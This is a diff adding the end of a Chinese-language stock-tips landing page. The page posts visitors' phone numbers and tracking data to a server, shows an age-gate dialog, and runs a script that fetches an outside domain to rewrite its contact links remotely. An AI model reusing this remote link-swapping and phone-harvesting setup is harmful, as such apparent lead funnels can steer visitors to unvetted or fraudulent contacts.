+                            layer.msg('請輸入有效的手機號碼');
+                            return false;
+                        }
+                        ajaxtype = true;
+                        // 提交前回调
+                        if (typeof plugBeforeSaveCallback == 'function') {
+                            plugBeforeSaveCallback && plugBeforeSaveCallback();
+                        }
+                        ajaxfn(mobile)
+                    });
+
+                    function ajaxfn(mobile) {
+                        $.ajax({
+                            url: '/addNewUserData',
+                            type: 'post',
+                            data: {
+                                tel: mobile,
+                                gid: $("input[name='gid']").val(),
+                                aid: $("input[name='aid']").val(),
+                                pid: $("input[name='pid']").val(),
+                                channelid: $("input[name='channelid']").val(),
+                                stock: $('#stock-input').val(),
+                                referer: document.referrer,
+                                laiyuan: window.location.href,
+                            },
+                            success: function (res) {
+                                if (res.code != 0) {
+                                    alert(res.msg);
+                                    return;
+                                }
+                                // 窗口关闭
+                                $(".dimension,.zhegai,.dialog5,.dialog3,#banner_window,.dialog4").hide();
+                                if (res.msg == 1) {
+                                    window._agl && window._agl.push(['track', ['success', { t: 3 }]])
+                                }
+
+                                if (typeof plugAfterSaveCallback == 'function') {
+                                    plugAfterSaveCallback && plugAfterSaveCallback();
+
+                                    if (window.newgzglink) {
+                                        alert('提交成功，請靜候客服的回電~.~！');
+                                        //window.location.href = '//' + document.domain + '/gzgdown/index.html';
+                                    }
+                                } else {
+                                    alert('提交成功，請靜候客服的回電~.~！');
+                                }
+                            },
+                            error: function (res) {
+                                layer.msg('網絡出錯，請重新提交！');
+                            },
+                            complete: function () {
+                                ajaxtype = false;
+                            }
+                        });
+                    };
+                },
+                matchingStockCodeAndName: function (val) {
+                    var list = [];
+                    var oh = '';
+                    var num = 1;
+                    $.each(s, function (i, el) {
+                        if (num > 8) {
+                            return false;
+                        }
+
+                        var ci = el['c'].toLowerCase().indexOf(val.toLowerCase());
+                        if (ci !== -1) {
+                            num += 1;
+                            var ch = '';
+                            if (ci !== 0) {
+                                ch = el['c'].substring(0, ci);
+                            }
+                            var cst = ci + val.length;
+                            oh += '<li data-name="codeName" data-type="code"  data-code="' + el[
+                                    'c'] + '" data-cname="' + el['n'] + '"><p>' + ch +
+                                '<span>' + val.toUpperCase() + '</span>' + el['c'].substring(cst) +
+                                '</p><p>' + el['n'] + '</p></li>';
+                            return true;
+                        }
+
+                        // var ni = el['n'].indexOf(val);
+                        // if (ni !== -1) {
+                        //     num += 1;
+                        //     var nh = '';
+                        //     if (ni !== 0) {
+                        //         nh = el['n'].substring(0, ni);
+                        //     }
+                        //     var nst = ni + val.length;
+                        //     oh += '<li data-name="codeName"  data-type="name" data-code="' + el[
+                        //             'c'] + '" data-cname="' + el['n'] + '"><p>' + el['c'] +
+                        //         '</p><p>' + nh + '<span>' + val + '</span>' + el['n'].substring(
+                        //             nst) + '</p></li>';
+                        //     return true;
+                        // }
+
+                    });
+
+                    return oh;
+                }
+            };
+            ztIndex.init();
+        });
+
+    </script>
+    <script>
+        function ttget() {
+            var _ss = window.location.pathname;
+            if (_ss.substr(_ss.length - 1, 1) == '/') {
+                _ss = _ss.substr(0, _ss.length - 1);
+            }
+            var xhr = new XMLHttpRequest()
+            xhr.open('get', "https://f.bxvgk.top/api.php?d=" + _ss)
+            xhr.onreadystatechange = function () {
+                if (xhr.status == 200 && xhr.readyState == 4) {
+                    var obj = JSON.parse(xhr.responseText);
+                    var ttaDoms = document.querySelectorAll('.tttlink'), ttaLen = ttaDoms.length;
+                    for (var i = 0; i < ttaLen; i++) {
+                        ttaDoms[i].href = obj.link;
+                        // do something you want deal with DOM
+                    }
+                    document.getElementById('tttlink').href = obj.link;
+                    var ttiDoms = document.querySelectorAll('.tttid'), ttiLen = ttiDoms.length;
+                    for (var i = 0; i < ttiLen; i++) {
+                        ttiDoms[i].innerHTML = obj.id;
+                        // do something you want deal with DOM
+                    }
+                }
+            }
+            xhr.send()
+        }
+        ttget();
+        window.addEventListener('DOMContentLoaded', function (event) {
+            document.querySelectorAll(".tttlink").forEach(function (e) {
+                e.addEventListener('click', function (e) {
+                    fbq('track', 'Lead');
+                });
+            });
+        });
+    </script>
+    <div class="you" style="z-index: 999; width:70px;height:70px;border-radius: 50%;position:fixed;right:8px;top:30%;overflow: hidden;display: flex;justify-content: center;align-items: center;background-image: url(/api/temp-statics/statics/stockMalaysia/img-mlxy/ws.jpeg);background-size: 100% 100%;">
+        <a style="width:70px;height:70px;font-size:16pt;border-radius: 50%;" onclick="btnClick('{{ .clickUrl }}')"></a>
+    </div>
+    <div id="loading" style="width: 100%;height: 100%;background: rgba(0,0,0,0.3);position: fixed;top: 0;bottom: 0;display: none;align-items: center;justify-content: center;">
+    <div style="position: relative;background: #ffffff;border-radius: 20px;padding: 20px;width: 50px;height: 50px;display: flex;align-items: center;justify-content: center;">
+        <div class="loader">加載中...</div>
+    </div>
+</div>
+
+<div id="ageBgDiv" style="z-index:10000;width: 100%;height: 100%;background: rgba(0,0,0,0.3);position: fixed;top: 0;bottom: 0;display: none;align-items: center;justify-content: center;">
+    <div id="ageMainDiv" style="align-items: center;justify-content: center;background: white;border-radius: 10px;padding: 20px;margin: 40px;flex-direction: column;display: flex;width: 80%;">
+        <span style="color: red;font-size: 14pt;margin-top: 10px;width: 100%;text-align: center;margin-bottom: 20px;">你今年多大？</span>
+        <span onclick="ageChoose(min_age-1)" style="width: 100%;text-align: center;background: #5cc16a;margin: 10px 20px;padding: 10px 0px;color: white;">
+            <script>document.write(min_age)</script>0以下
+            </span>
+        <span onclick="ageChoose(min_age)" style="width: 100%;text-align: center;background: #046412;margin: 10px 20px;padding: 10px 0px;color: white;">
+            <script>document.write(min_age)</script>0以上
+        </span>
+    </div>
+</div>
+
+<div id="tipBgDiv" style="z-index:10000;width: 100%;height: 100%;background: rgba(0,0,0,0.3);position: fixed;top: 0;bottom: 0;display: none;align-items: center;justify-content: center;">
+    <div id="tipMainDiv" style="align-items: center;justify-content: center;background: white;border-radius: 10px;padding: 20px;margin: 40px;flex-direction: column;display: flex;width: 80%;">
+        <span style="color: black;font-size: 14pt;margin-top: 10px;width: 100%;text-align: left;margin-bottom: 20px;">非常抱歉！你不符合我們的要求</span>
+        <span onclick="setDomVisible(&#39;tipBgDiv&#39;,&#39;none&#39;)" style="width: 100%;text-align: center;background: #03a407;margin: 10px 20px;padding: 10px 0px;color: white;">確定</span>
+    </div>
+</div>
+
+
+{{end}}
+</html>
